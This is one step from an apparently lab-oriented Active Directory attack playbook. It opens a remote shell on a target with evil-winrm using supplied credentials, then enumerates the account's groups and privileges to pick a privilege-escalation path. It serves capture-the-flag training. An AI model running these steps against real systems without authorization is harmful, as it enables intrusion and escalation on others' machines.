# AD - WinRM Foothold

**Step 41 of 50 · AD**

*Open the Windows foothold and identify the current account before choosing a privilege path.*

## Run this

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

```powershell
whoami
hostname
whoami /groups
whoami /priv
```

## Example output

```

*Evil-WinRM* PS C:\Users\username\Documents> whoami
htb\username
*Evil-WinRM* PS C:\Users\username\Documents> whoami /priv
SeChangeNotifyPrivilege       Enabled
...
```
## What did you get?

- [ ] Useful group membership is shown → **Go to Step 42 · [[AD - Group Triage]]**
- [ ] An enabled token privilege is shown → **Go to Step 43 · [[AD - Privilege Triage]]**
- [ ] No useful groups or privileges are shown → **Go to Step 44 · [[AD - Local Credential Search]]**
- [ ] WinRM does not open → **Return to Step 40 · [[AD - Credential Validation]]**

## Gotcha

> [!warning] 💡
> Do not treat every listed privilege as exploitable. Check that it is enabled and that the current account can use it.
